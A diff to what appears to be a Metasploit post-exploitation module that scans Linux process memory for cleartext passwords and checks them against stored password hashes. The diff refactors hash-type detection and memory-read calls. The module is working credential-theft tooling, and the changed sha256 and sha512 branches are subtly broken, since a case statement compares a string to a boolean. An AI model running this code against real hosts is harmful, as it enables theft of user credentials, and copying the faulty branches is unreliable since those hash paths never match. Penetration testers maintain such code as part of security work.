@@ -4,6 +4,7 @@
 ##
 
 require 'unix_crypt'
+require 'metasploit/framework/hashes/identify'
 
 class MetasploitModule < Msf::Post
   include Msf::Post::Linux::Priv
@@ -85,23 +86,11 @@ class MetasploitModule < Msf::Post
   def configure_passwords(user_data = [])
     user_data.each do |info|
       hash = info['hash']
-      case hash[0..2]
-      when '$1$'
-        info['type'] = 'md5'
-      when '$2a', '$2y'
-        info['type'] = 'blowfish'
-      when '$5$'
-        info['type'] = 'sha256'
-      when '$6$'
-        info['type'] = 'sha512'
-      when '$y$'
-        info['type'] = 'yescrypt'
-      else
-        info['type'] = 'unsupported'
-      end
+      hash_format = identify_hash(hash)
+      info['type'] = hash_format.empty? ? 'unsupported' : hash_format
 
       salt = ''
-      if info['type'] == 'blowfish'
+      if info['type'] == 'bf'
         arr = hash.split('$')
         next if arr.length < 4
 
@@ -137,7 +126,7 @@ class MetasploitModule < Msf::Post
     target_info['pids'] = target_pids
     target_info['pids'].each_with_index do |target_pid, _ind|
       vprint_status("Searching PID #{target_pid}...")
-      res = mem_search_ascii(target_pid, 5, 500, target_info['needles'])
+      res = mem_search_ascii(5, 500, target_info['needles'], pid: target_pid)
       target_info['matches'][target_pid] = res.empty? ? nil : res
     end
   end
@@ -148,7 +137,7 @@ class MetasploitModule < Msf::Post
     start_addr = start_addr.to_i(16)
     end_addr = end_addr.to_i(16)
 
-    [ start_addr, end_addr ]
+    { 'start' => start_addr, 'end' => end_addr }
   end
 
   # Selects memory regions to read based on locations
@@ -176,7 +165,9 @@ class MetasploitModule < Msf::Post
       match_ind = lines.index { |line| line.split('-').first.include?(match_addr) }
       prev = lines[match_ind - 1]
       if prev && prev.include?('00000000 00:00 0')
-        start_addr, end_addr = format_addresses(prev)
+        formatted = format_addresses(prev)
+        start_addr = formatted['start']
+        end_addr = formatted['end']
         length = end_addr - start_addr
 
         updated_regions << { 'start' => start_addr, 'length' => length }
@@ -184,7 +175,9 @@ class MetasploitModule < Msf::Post
 
       post = lines[match_ind + 1]
       if post && post.include?('00000000 00:00 0')
-        start_addr, end_addr = format_addresses(post)
+        formatted = format_addresses(post)
+        start_addr = formatted['start']
+        end_addr = formatted['end']
         length = end_addr - start_addr
 
         updated_regions << { 'start' => start_addr, 'length' => length }
@@ -212,14 +205,18 @@ class MetasploitModule < Msf::Post
         adj_region = lines[curr_index + 1]
         return updated_regions if adj_region.nil?
 
-        start_addr, end_addr = format_addresses(adj_region)
+        formatted = format_addresses(adj_region)
+        start_addr = formatted['start']
+        end_addr = formatted['end']
         length = end_addr - start_addr
         updated_regions << { 'start' => start_addr, 'length' => length }
         return updated_regions
       end
 
       between_vals.each do |addr_line|
-        start_addr, end_addr = format_addresses(addr_line)
+        formatted = format_addresses(addr_line)
+        start_addr = formatted['start']
+        end_addr = formatted['end']
         length = end_addr - start_addr
         updated_regions << { 'start' => start_addr, 'length' => length }
       end
@@ -234,7 +231,7 @@ class MetasploitModule < Msf::Post
     max_addr = start_addr + section_len
 
     while curr_addr < max_addr
-      data = mem_read(pid, curr_addr, 1000)
+      data = mem_read(curr_addr, 1000, pid: pid)
       lines << data.split(/[^[:print:]]/)
       lines = lines.flatten
       curr_addr += 800
@@ -261,12 +258,12 @@ class MetasploitModule < Msf::Post
         case pass_type
         when 'md5'
           hashed = UnixCrypt::MD5.build(str, salt)
-        when 'blowfish'
+        when 'bf'
           BCrypt::Engine.cost = pass_info['cost'] || 12
           hashed = BCrypt::Engine.hash_secret(str, hash[0..28])
-        when 'sha256'
+        when pass_type.include?('sha256')
           hashed = UnixCrypt::SHA256.build(str, salt)
-        when 'sha512'
+        when pass_type.include?('sha512')
           hashed = UnixCrypt::SHA512.build(str, salt)
         when 'yescrypt'
           get_python_version
